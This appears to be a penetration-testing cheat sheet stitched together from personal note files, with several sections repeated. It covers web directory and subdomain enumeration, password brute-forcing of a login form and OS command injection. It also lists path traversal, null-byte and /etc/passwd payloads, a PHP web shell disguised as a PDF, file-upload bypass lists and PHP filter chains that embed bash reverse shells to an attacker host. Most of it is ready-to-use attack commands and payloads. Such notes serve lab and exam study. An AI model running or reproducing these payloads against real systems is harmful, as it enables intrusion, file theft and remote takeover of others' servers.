## Web Application Directory Enumeration Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Web Application Directory Enumeration Checklist`

1. Check `robots.txt`.
2. Check `sitemap.xml`.
3. Run `feroxbuster`:

```bash
feroxbuster -u https://192.168.123.100
```

4. Use `feroxbuster` with specific wordlists and file extensions:

```bash
feroxbuster -u http://192.168.123.100 -w $SECLIST/Discovery/Web-Content/raft-large-words-lowercase.txt -x php,bash,sh,txt,bak,backup,sql
```

5. Perform deeper enumeration:

```bash
feroxbuster -k -u http://192.168.180.100:7742/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200

# consider lower or higher -t (min 50, max 500)
```

6. Use Katana for URL discovery:

```bash
katana -u http://192.168.123.100/
```

7. Collect base URLs in Burp Suite and export them to `rest.txt`.
8. Input `rest.txt` to `feroxbuster` for further enumeration:

```bash
cat rest.txt | feroxbuster --stdin -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -E -x txt,php,html,js,json,xml,yaml,tf,sh,bash,py,tmp,lua,pem,pkk -d 2 -m POST,GET
```

9. Search for hidden files and directories.
10. Repeat enumeration steps—**Enumeration is key; try harder.**
11. Verify all findings and ensure no steps were missed.


## Vhost / Subdomains

> Source: `01101100-C0D3X-00110110.md` → `Vhost / Subdomains`

Vhost fuzzing needs to be slowed down when testing production instances as it could lead to an unintended denial of service.

```bash
gobuster vhost -u host.domain.tld -w '/usr/share/wordlists/amass/subdomains-top1mil-5000.txt' -t 50 --append-domain
```

```bash
ffuf -H "Host: FUZZ.relia.com" -H "User-Agent: GIGS" -c -w "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" -u relia.com

ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"
```

```bash
wfuzz -H "Host: FUZZ.something.com" --hc 401,404,403 -H "User-Agent: GIGS" -c -z file,"/path/to/wordlist.txt" $URL
```

```bash
dnsrecon -d $domain -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$domain" -u http://$IP
```


## Using `nslookup` (Windows)

> Source: `01101100-C0D3X-00110110.md` → `Vhost / Subdomains > Using `nslookup` (Windows)`

```bash
nslookup <sub>.website.com

nslookup -type=TXT <sub>.website.com <IP>
```


## Input Field Manipulation

> Source: `01101100-C0D3X-00110110.md` → `Vhost / Subdomains > Web Application Analysis > Input Field Manipulation`

Look for user input fields and attempt to inject OS commands. Use Burp Suite Repeater or `curl`. Remember to URL encode your payloads.

> **Example (Git-related):** This specific example might only work if `git` is in the command.

```bash
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

> **Tip:** Initially inspect the behavior in a browser before using command-line tools for easier analysis.


## ffuf

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > ffuf`

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
```


## gobuster

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > ffuf > gobuster`

```
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm

gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
```


## FEROXBUSTER

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > FEROXBUSTER`

```bash
feroxbuster -k -u http://192.168.180.100:7742/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200

# consider lower or higher -t (min 30, max 500)

feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #if we dont want to see any denied

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #if website redirects
```


## ffuf

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > java/apk files > ffuf`

```
ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
```

```
POST /index.php HTTP/1.1

Host: 10.11.1.252:8000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 42

Origin: http://10.11.1.252:8000

Connection: close

Referer: http://10.11.1.252:8000/login.php

Cookie: PHPSESSID=89i7fj326pnqqarv9c03dpcuu2

Upgrade-Insecure-Requests: 1

username=admin&password=FUZZ&submit=Log+In
```

```
[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 165ms]
    * FUZZ: asdfghjkl;'

[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 172ms]
    * FUZZ: asdfghjkl;\\'
```

```
https://cybersecnerds.com/ffuf-everything-you-need-to-know/
```


## `feroxbuster`

> Source: `01101100-RUN3-00110110.md` → `git - enumerate in parent directory of `.git` > Directory and File Discovery Tools > `feroxbuster``

```bash
feroxbuster -k -u http://192.168.236.249:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json
```


## FEROXBUSTER

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > FEROXBUSTER`

```bash
feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #if we dont want to see any denied

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #if website redirects
```


## Web Application Directory Enumeration Checklist

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > Detailed Checklists > Web Application Directory Enumeration Checklist`

1. Check `robots.txt`.
2. Check `sitemap.xml`.
3. Run `feroxbuster`:

    ```bash
    feroxbuster -u https://192.168.123.100
    ```

4. Use `feroxbuster` with specific wordlists and file extensions:

    ```bash
    feroxbuster -u http://192.168.123.100 -w $SECLIST/Discovery/Web-Content/raft-large-words-lowercase.txt -x php,bash,sh,txt,bak,backup,sql
    ```

5. Perform deeper enumeration:

    ```bash
    feroxbuster -u http://192.168.123.100/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 80 --filter-status 404,500 --depth 2
    ```

6. Use Katana for URL discovery:

    ```bash
    katana -u http://192.168.123.100/
    ```

7. Collect base URLs in Burp Suite and export them to `rest.txt`.
8. Input `rest.txt` to `feroxbuster` for further enumeration:

    ```bash
    cat rest.txt | feroxbuster --stdin -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -E -x txt,php,html,js,json,xml,yaml,tf,sh,bash,py,tmp,lua,pem,pkk -d 2 -m POST,GET
    ```

9. Search for hidden files and directories.
10. Repeat enumeration steps—**Enumeration is key; try harder.**
11. Verify all findings and ensure no steps were missed.


## Vhost / Subdomains

> Source: `01111110-SCR0LL-01111110.md` → `Vhost / Subdomains`

Vhost fuzzing needs to be slowed down when testing production instances as it could lead to an unintended denial of service.

```bash
ffuf -H "Host: FUZZ.relia.com" -H "User-Agent: GIGS" -c -w "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" -u relia.com

ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"
```

```bash
wfuzz -H "Host: FUZZ.something.com" --hc 401,404,403 -H "User-Agent: GIGS" -c -z file,"/path/to/wordlist.txt" $URL
```

```bash
dnsrecon -d $domain -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$domain" -u http://$IP
```

---


## Null Byte

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Information Gathering > Gobuster > Null Byte`

```
%00
0x00
```
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```


## php://filter Wrapper

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Information Gathering > Gobuster > php://filter Wrapper`

> [https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb](https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb)

> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

```
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```
```
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```
```
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

---

```
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```
```
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```
```
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```
```
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

> [https://github.com/synacktiv/php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator)

```
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```
```
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```
```
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```
```
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > <FILE>
```
```
curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
```
```
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```
```
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```
